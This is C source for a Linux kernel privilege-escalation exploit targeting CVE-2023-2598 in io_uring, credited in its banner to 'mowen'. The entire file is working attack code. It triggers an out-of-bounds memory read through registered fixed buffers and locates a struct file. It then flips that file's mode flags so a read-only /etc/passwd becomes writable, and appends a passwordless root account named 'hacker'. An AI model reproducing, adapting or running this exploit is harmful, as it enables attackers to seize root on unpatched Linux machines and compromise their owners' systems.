#define _GNU_SOURCE 
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <liburing.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <mqueue.h>

#include <sys/syscall.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include<sys/stat.h>
#pragma pack(16)

#define __int64 long long
#define CLOSE printf("\033[0m\n");
#define RED printf("\033[31m");
#define GREEN printf("\033[36m");
#define BLUE printf("\033[34m");
#define YELLOW printf("\033[33m");
#define _QWORD unsigned long
#define _DWORD unsigned int
#define _WORD unsigned short
#define _BYTE unsigned char
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_BLUE "\033[34m"
#define COLOR_DEFAULT "\033[0m"
#define showAddr(var)  dprintf(2, COLOR_GREEN "[*] %s -> %p\n" COLOR_DEFAULT, #var, var); 
#define logu(fmt, ...) dprintf(2,  "[*]  " fmt "\n" , ##__VA_ARGS__)
#define logd(fmt, ...) dprintf(2, COLOR_BLUE "[*] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...) dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...) dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...) dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)
#define debug(fmt, ...)                      \
    do {                                     \
        loge(fmt, ##__VA_ARGS__);            \
        loge("debug at line %d", __LINE__);  \
        getchar();                           \
    } while (0)


void bind_cpu(int core);

#define PAGE_SIZE 0x1000  
#define VIR_START_ADDR 0xaabbcc0000
#define SUBMIT_READ 0
#define SUBMIT_WRITE 1
void prep_rlimit(int *nr_memfds,int *nr_files){
    struct rlimit max_file;

    getrlimit(RLIMIT_NOFILE,&max_file);
    logu("rlim_cur -> %d rlim_max -> %d",max_file.rlim_cur,max_file.rlim_max);
    max_file.rlim_cur=max_file.rlim_max;
    setrlimit(RLIMIT_NOFILE,&max_file);

    int limit = max_file.rlim_max/4;
    *nr_memfds = limit/2;
    *nr_files= limit - *nr_memfds;
    logu("nr_memfds -> %d nr_files -> %d",*nr_memfds,*nr_files);
}
int setup_memfd_physics(char* name,int real_size){
    int fd = memfd_create(name,MFD_CLOEXEC);
    fallocate(fd,0,0,PAGE_SIZE*real_size);
    return fd;
}

int leak_addr(void* addr,uint64_t size){
    int  ret = -1;
    uint64_t* tmp = (uint64_t* )addr;
    for (size_t i = 0; i < size/8; i++)
    {
        // if( tmp[i] != 0)
        //     logi(" addr: %p offset: 0x%llx -> %p",addr+i,i,tmp[i]);
        if(tmp[i]==0x484a801d00008000){
            logw("successful!! addr: %p offset: 0x%llx -> %p",addr+i*8,i*8,tmp[i]);
            ret = i*8-0x40;
        }     
    }
    return ret;  
}
void memfds_bind_virtual(int fd, int size){
    for (size_t i = 0; i < size; i++)
    {
        if( mmap(VIR_START_ADDR+i*PAGE_SIZE , PAGE_SIZE,PROT_READ|PROT_WRITE,
                       MAP_SHARED|MAP_FIXED,fd,0 )==MAP_FAILED )
                       die("failed mmap memfds_buf");
    }
}
void submit_sqe(struct io_uring* ring,int fd,void* buf, unsigned int size,int FLAGS){
    struct io_uring_sqe * sqe;
    struct io_uring_cqe* cqe;
    int ret;
    sqe = io_uring_get_sqe(ring);
    switch (FLAGS)
    {
    case SUBMIT_WRITE:
        io_uring_prep_write_fixed(sqe,fd,buf,size,0,0);
        break;
    case SUBMIT_READ:
        io_uring_prep_read_fixed(sqe,fd,buf,size,0,0);
        break;
    default:
        return;
    }
    ret = io_uring_submit(ring);
    if (ret < 0) {
        die("failed io_uring_submit");
    }
    io_uring_wait_cqe(ring,&cqe);
    io_uring_cqe_seen(ring,cqe);
}


int main(void){
    int ret,nr_memfds,nr_files,tmp;
    int *memfds,*files;
    int recv_fd,block_size;
    int nr_pages;
    void* oob_buf ,*recv_buf;
    int passwd_fd,passwd_size;
    char* hacker_buf;
    int hacker_len;
    struct stat status;
    struct io_uring ring;
    struct iovec uiovec;
    struct io_uring_cqe* cqe;
    struct io_uring_sqe* sqe;
    RED;puts("[*] CVE-2023-2598 Exploit by mowen");CLOSE;
    bind_cpu(0);
// 1、解除当前进程限制
    prep_rlimit(&nr_memfds,&nr_files);
// 2、初始化 io_uring、共享空间

    stat("/etc/passwd",&status);
    passwd_size=status.st_size;
    hacker_buf =(char*) malloc(passwd_size*2);
    logi("passwd_size -> %d",passwd_size);

    passwd_fd = open("/etc/passwd",O_RDONLY);
    read(passwd_fd,hacker_buf,passwd_size);
    strcat(hacker_buf,"hacker::0:0:root:/root:/bin/sh\n");
    hacker_len =strlen(hacker_buf);
    logu("io_uring_queue_init");
    io_uring_queue_init(4,&ring,0);

    memfds = malloc(sizeof(*memfds)*nr_memfds);
    files = malloc(sizeof(*files)*nr_files);
    logu("init memfds && files");
    for (size_t i = 0,tmp=0; i < nr_memfds; i++)
    {
        memfds[i]=setup_memfd_physics("mowen_fd",1);
        if(i < nr_files) {
            // files[i] =open("/tmp/mowen",O_RDWR|O_APPEND|O_CREAT,0644); // 0x484f801f,     
            files[i] =open("/etc/passwd",O_RDONLY); // 0x484a801d00008000
            tmp++;
        }
    }
    // 0x484f801f00008402
    nr_files = tmp;
    nr_pages = 65000;
    
    logu("init recv_buf");
    block_size = 0x100;
    recv_fd=setup_memfd_physics("recv_fd",block_size);
    recv_buf = mmap(0,block_size*PAGE_SIZE,PROT_WRITE|PROT_READ,
                        MAP_SHARED,recv_fd,0);              
    if(recv_buf==MAP_FAILED)
            die("failed mmap recv_buf"); 
    logi("recv_buf -> %p",recv_buf);

    for (size_t i = 0; i < nr_pages; i++)
    {
// 3、注册 fixed buf
        logu("memfds bind virtual");
        memfds_bind_virtual(memfds[i],nr_pages);
        oob_buf = VIR_START_ADDR;
        uiovec.iov_base = oob_buf;
        uiovec.iov_len =  nr_pages* PAGE_SIZE;
        logi("io_uring_register_buffers");

        ret = io_uring_register_buffers(&ring,&uiovec,1);
        if( ret < 0 )die("failed io_uring_register_buffers");
        logd("uiovec.iov_base -> %p uiovec.iov_len -> %llx",uiovec.iov_base,uiovec.iov_len);      
// 4、尝试oob
        for (size_t vir_off = 0; vir_off < (nr_pages-block_size); vir_off+=block_size)
        {
            void* oob_addr = uiovec.iov_base+vir_off*PAGE_SIZE;
            submit_sqe(&ring,recv_fd,oob_addr,block_size,SUBMIT_WRITE);
            // binary_dump("recv_buf",recv_buf,block_size*PAGE_SIZE);
            ret= leak_addr(recv_buf,block_size*PAGE_SIZE);
            if (ret==-1) continue;
// 5、oob读取成功，开始提取信息
            logu("oob_addr -> %p offset -> %p",oob_addr,vir_off*PAGE_SIZE);
            void* filp_addr = oob_addr+ret;
            logi("offset : %d v2p_filp_addr : %p",ret,filp_addr);
// 6、篡改filp
            *(uint32_t*)recv_buf = 0x484f801f;
            submit_sqe(&ring,recv_fd,filp_addr+68,4,SUBMIT_READ);
        
            for (size_t i = 0; i < nr_files; i++)
            {
                if(write(files[i],hacker_buf,hacker_len)>0){
                    logw(" hacker /etc/passwd successful");
                    break;
                }                  
            }
            stat("/etc/passwd",&status);
            logu("passwd_size -> %d",status.st_size);
            if(status.st_size==passwd_size)continue;
            logi("su hacker to get root");
            exit(0);
        }

        io_uring_unregister_buffers(&ring);
        munmap(oob_buf,nr_pages* PAGE_SIZE);
    }
    
    munmap(recv_buf,block_size*PAGE_SIZE);
    close(recv_fd);
    for (size_t i = 0; i < nr_memfds ; i++)
    {
        close(files[i]);
        close(memfds[i]);
    }
    
    
    RED;puts("[*]failed");CLOSE;
    return 0;
}

void bind_cpu(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
    BLUE;printf("[*] bind_cpu(%d)",core);CLOSE;
}




